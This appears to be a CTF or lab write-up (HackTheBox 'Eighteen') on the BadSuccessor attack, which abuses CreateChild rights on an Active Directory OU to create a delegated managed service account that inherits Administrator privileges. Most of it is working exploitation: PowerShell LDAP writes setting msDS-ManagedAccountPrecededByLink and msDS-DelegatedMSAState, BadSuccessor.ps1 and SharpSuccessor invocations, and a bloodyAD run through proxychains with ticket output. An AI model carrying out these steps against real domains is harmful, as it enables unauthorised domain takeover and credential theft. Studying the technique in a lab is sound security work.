# Permiisons over OU’s (dMSA)

# Define the Distinguished Name (DN) of the OU and the Group Name

```powershell
$OUPath    = "AD:\OU=Sales,DC=domain,DC=com"
$GroupName = "Sales-Admins"
```

# Retrieve the ACL and filter by the group's IdentityReference

```powershell
(Get-Acl -Path $OUPath).Access |
Where-Object { $_.IdentityReference -like "*$GroupName*" } |
Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, IsInherited
```

# example

```powershell
evil-winrm-py PS C:\Users\adam.scott\Documents> Import-Module ActiveDirectory
Get-PSDrive AD

Name           Used (GB)     Free (GB) Provider      Root                                                CurrentLocation
----           ---------     --------- --------      ----                                                ---------------
AD                                     ActiveDire... //RootDSE/                                                         

evil-winrm-py PS C:\Users\adam.scott\Documents> $OUPath = "AD:\OU=STAFF,DC=EIGHTEEN,DC=HTB"
$GroupName = "EIGHTEEN\IT"
 
(Get-Acl -Path $OUPath).Access |
    Where-Object { $_.IdentityReference -eq $GroupName } |
    Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, IsInherited

IdentityReference ActiveDirectoryRights AccessControlType IsInherited
----------------- --------------------- ----------------- -----------
EIGHTEEN\IT                 CreateChild             Allow       False

```

**If an attacker can create any dMSA inside an OU and directly manipulate those 2 attributes, LSASS & the KDC will treat the dMSA as a successor of the linked account. When the attacker subsequently authenticates as the dMSA they inherit all the privileges of the linked account – up to Domain Admin if the Administrator account is linked.[1]**

- **msDS-ManagedAccountPrecededByLink** – DN link to the superseded (old) account.
- **msDS-DelegatedMSAState** – migration state (0 = none, 1 = in-progress, 2 = completed).[1]

Unit 42 released a PowerShell helper script that parses security descriptors of each OU and highlights the required ACEs:[1]

Once a writable OU is identified the attack is only 3 LDAP writes away:[1]

# 1. Create a new delegated MSA inside the delegated OU

```powershell
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"
```

# 2. Point the dMSA to the target account (e.g. Domain Admin)

```powershell
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}
```

# 3. Mark the migration as *completed*

```powershell
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

After replication the attacker can simply logon as attacker_dMSA$ or request a Kerberos TGT – Windows will build the token of the superseded account.[1]%

![image.png](Permiisons%20over%20OU%E2%80%99s%20%28dMSA%29/image.png)

[https://github.com/akamai/BadSuccessor](https://github.com/akamai/BadSuccessor)

There are a couple ways to do this in practice:

- Much of it can be done in PowerShell, but it’s relatively complex.
- There’s a tool called [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) that will create the dMSA and make the malicious link (steps 1 and 2 above), where I could then use [Rubeus](https://github.com/GhostPack/Rubeus) to get a TGT with the Administrator groups. This does suffer from a challenge similar to the double hop problem over WinRM.
- I can create a tunnel back to my host and use [NetExec](https://www.netexec.wiki/) and [Impacket](https://github.com/SecureAuthCorp/impacket) tools.

# Executing the BadSuccessor Attack

Run the BadSuccessor PowerShell script to create a delegated access path to the Administrator account.

```
./BadSuccessor.ps1 -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "****" -DelegateAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

**Explanation:**

The BadSuccessor attack exploits the way Active Directory handles inherited permissions on Organizational Units.

**Parameter Breakdown:**

| Parameter | Description |
| --- | --- |
| `-mode exploit` | Run in exploitation mode (creates the malicious configuration) |
| `-Path "OU=Staff,DC=eighteen,DC=htb"` | The target Organizational Unit path where we have or can gain delegation rights |
| `-Name "****"` | Name for the created object (redacted in writeup) |
| `-DelegateAdmin "adam.scott"` | The user account we control that will receive elevated privileges |
| `-DelegateTarget "Administrator"` | The target account we want to impersonate |
| `-domain "eighteen.htb"` | The Active Directory domain name |

```powershell
evil-winrm-py PS C:\Users\adam.scott\Documents> .\SharpSuccessor.exe add /imper
sonate:Administrator /path:"ou=IT, DC=eighteen,dc=htb" /account:adam.scott /nam
e:******

```

**Explanation:**

This command configures the Active Directory objects needed for the impersonation attack:

| Parameter | Description |
| --- | --- |
| `add` | Operation mode - adding a new configuration |
| `/impersonate:Administrator` | The account we want to impersonate |
| `/path:"ou=IT, DC=eighteen,dc=htb"` | The OU path where the object will be created |
| `/account:adam.scott` | Our controlled account that will perform the impersonation |
| `/name:******` | Name of the created object (redacted) |

```powershell
> proxychains bloodyAD --host <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' add badSuccessor -t "<TARGET_DN>" --ou "<OU_DN>" --prepatch delegate
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[+] Creating DMSA delegate$ in OU=STAFF,DC=EIGHTEEN,DC=HTB
[+] Impersonating: CN=ADMINISTRATOR,CN=USERS,DC=EIGHTEEN,DC=HTB
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
Clock skew detected. Adjusting local time by 7:00:00.353524. Retrying operation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK

Realm        : EIGHTEEN.HTB
Sname        : krbtgt/EIGHTEEN.HTB
UserName     : delegate$
UserRealm    : eighteen.htb
StartTime    : 2026-09-11 18:07:05+00:00
EndTime      : 2026-09-12 04:07:04+00:00
RenewTill    : 2026-09-12 18:07:03+00:00
Flags        : forwardable, enc-pa-rep, renewable, pre-authent
Keytype      : 18
Key          : [REDACTED]
EncodedKirbi : [REDACTED TICKET MATERIAL]
[+] dMSA TGT stored in ccache file delegate_sp.ccache

dMSA current keys found in TGS:
AES256: <AES256_KEY>
AES128: <AES128_KEY>
RC4: <NTLM_HASH>

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: <PREVIOUS_NTLM_HASH>

```